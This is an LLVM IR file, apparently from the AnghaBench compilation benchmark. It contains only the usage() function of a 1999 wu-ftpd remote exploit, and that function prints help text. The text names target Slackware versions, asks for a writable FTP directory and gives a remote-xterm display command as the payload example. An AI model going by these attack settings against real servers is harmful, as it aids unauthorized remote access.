; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19087.c_usage.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19087.c_usage.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [55 x i8] c" \0ASDI wu-ftpd remote exploit (http://www.sekure.org)\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [52 x i8] c" %s host user password dir command [port] [align]\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [47 x i8] c" host:         the victim (ftp.microsoft.com)\0A\00", align 1
@.str.3 = private unnamed_addr constant [55 x i8] c" user:         ftp user with write access (anonymous)\0A\00", align 1
@.str.4 = private unnamed_addr constant [56 x i8] c" password:     the password for the user (foo@bar.com)\0A\00", align 1
@.str.5 = private unnamed_addr constant [71 x i8] c" dir:          the directory you have permission to write (/incoming)\0A\00", align 1
@.str.6 = private unnamed_addr constant [77 x i8] c" command:      the command (\22/usr/X11R6/bin/xterm -display www.host.com:0\22)\0A\00", align 1
@.str.7 = private unnamed_addr constant [26 x i8] c" type:         see below\0A\00", align 1
@.str.8 = private unnamed_addr constant [38 x i8] c" port:         ftp port (21 default)\0A\00", align 1
@.str.9 = private unnamed_addr constant [42 x i8] c" align:        the alignment (3 default)\0A\00", align 1
@.str.10 = private unnamed_addr constant [60 x i8] c"\0A type:\0A 0 - slak3.4 ver 2.4(4)\0A 1 - slak3.4 ver beta-15&18\00", align 1
@.str.11 = private unnamed_addr constant [25 x i8] c"\0A 2 - slak3.3 ver 2.4(2)\00", align 1
@.str.12 = private unnamed_addr constant [56 x i8] c"\0A 3 - custom (change the code)\0A\0A See Netect advisory - \00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c" this is not suppose to be released soon! (Feb,1999)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @usage(i8* %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str, i64 0, i64 0))
  %4 = load i8*, i8** %2, align 8
  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.1, i64 0, i64 0), i8* %4)
  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.2, i64 0, i64 0))
  %7 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.3, i64 0, i64 0))
  %8 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.4, i64 0, i64 0))
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.5, i64 0, i64 0))
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.6, i64 0, i64 0))
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.7, i64 0, i64 0))
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.8, i64 0, i64 0))
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.9, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.10, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.11, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.12, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i64 0, i64 0))
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
